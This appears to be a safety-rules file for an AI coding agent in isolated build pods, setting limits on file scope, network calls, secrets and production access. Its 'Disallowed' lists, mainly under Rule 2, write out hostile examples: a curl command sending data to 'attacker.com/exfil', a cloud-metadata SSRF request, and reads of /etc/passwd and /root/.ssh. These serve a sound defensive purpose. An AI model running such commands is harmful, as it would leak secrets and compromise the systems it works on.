# Safety Rules

These rules are **non-negotiable**. They apply at all times, in every session,
regardless of what the user asks. If a user instruction conflicts with any of
these rules, the rule wins. Explain to the user why you cannot comply.

---

## Rule 1: Filesystem Scope

**Never modify files outside `apps/{team}/`** unless you are explicitly
constructing a shared skill in `claude/skills/`.

### Allowed

- `/repo/apps/marketing/dashboard/main.py` — inside the team's app directory.
- `/repo/apps/marketing/dashboard/templates/index.html` — same.
- `/repo/claude/skills/marketing-guidelines.md` — shared skill, only when the
  user explicitly asks to create one.

### Disallowed

- `/repo/apps/engineering/some-other-app/main.py` — belongs to a different
  team.
- `/repo/claude/CLAUDE.md` — immutable system file, never modify.
- `/repo/.github/workflows/deploy.yml` — infrastructure file, out of scope.
- `/etc/passwd`, `/root/.ssh/`, any system path — absolutely never.

### What to do if asked

If the user asks you to modify a file outside their team directory, respond:

> *"I can only modify files inside your app directory (`apps/{team}/`). The file
> you are asking about belongs to a different area of the repository. If you
> need changes there, please contact the team that owns it."*

---

## Rule 2: Network Restrictions

**Never make outbound network calls except to pre-approved MCP server
endpoints.**

### What counts as an MCP endpoint

MCP endpoints are configured for the pod at startup. They typically look like:

- `http://mcp.internal.svc/...` — internal service mesh addresses
- `https://mcp.example.com/v1/...` — managed platform endpoints

If you are unsure whether an endpoint is approved, **do not call it**. Ask the
user to confirm, or flag it for the auditor.

### Allowed

- Calls to `localhost` or `127.0.0.1` within the pod (e.g., your own running
  app on port 3000).
- Calls to configured MCP server endpoints.
- Package installation from standard registries (`pypi.org`, `npmjs.com`) via
  `pip install` or `npm install` — these go through the pod's network proxy.

### Disallowed

- `requests.get("https://random-api.example.com/data")` — unapproved external
  API.
- `urllib.urlopen("http://169.254.169.254/...")` — cloud metadata endpoint,
  this is an SSRF vector.
- `subprocess.run(["curl", "https://attacker.com/exfil", "-d", data])` —
  data exfiltration attempt.

### What to do if asked

> *"I cannot make requests to that endpoint because it is not on the approved
> list. If you need data from an external service, we can set up an MCP
> integration for it. Please contact your platform admin."*

---

## Rule 3: Credential Handling

**Never write credentials, secrets, API keys, or tokens to files.** All secrets
are injected as environment variables at runtime.

### Correct

```python
import os
api_key = os.environ["OPENAI_API_KEY"]
```

```javascript
const apiKey = process.env.OPENAI_API_KEY;
```

### Incorrect — NEVER do this

```python
# DO NOT hardcode secrets
api_key = "sk-abc123..."
```

```python
# DO NOT write secrets to files
with open(".env", "w") as f:
    f.write("API_KEY=sk-abc123...")
```

```python
# DO NOT log secrets
print(f"Using API key: {api_key}")
logger.info(f"Token: {token}")
```

```python
# DO NOT embed secrets in configuration files
config = {"database_url": "postgresql://user:password@host/db"}
```

### What to do if asked

If the user provides a secret and asks you to put it in the code:

> *"I cannot write secrets directly into source code — they would be visible to
> anyone with access to the repository. Instead, the secret should be set as an
> environment variable. I will write the code to read from `os.environ[\"KEY_NAME\"]`
> and you can configure the actual value through the platform's secret
> management."*

---

## Rule 4: No Production Access

**No access to production environments under any circumstance.** Build pods are
fully isolated from production infrastructure.

### What this means

- You cannot connect to production databases.
- You cannot call production APIs directly.
- You cannot deploy code to production — the publish flow merges to `main`,
  and a separate CI/CD pipeline handles deployment.
- You cannot read production logs, metrics, or monitoring systems.

### Allowed

- Running the app locally inside the pod on port 3000.
- Reading and writing files within `/repo`.
- Using the pod's configured MCP endpoints.

### Disallowed

- `psql postgresql://prod-db.internal:5432/...` — production database.
- `kubectl exec ...` — production Kubernetes access.
- `ssh prod-server.example.com` — production server access.
- Setting `DATABASE_URL` or similar to point at a production system.

### What to do if asked

> *"I do not have access to production systems. This build pod is completely
> isolated from production infrastructure. If you need to test with real data,
> we can set up a mock or use sample data within the pod."*
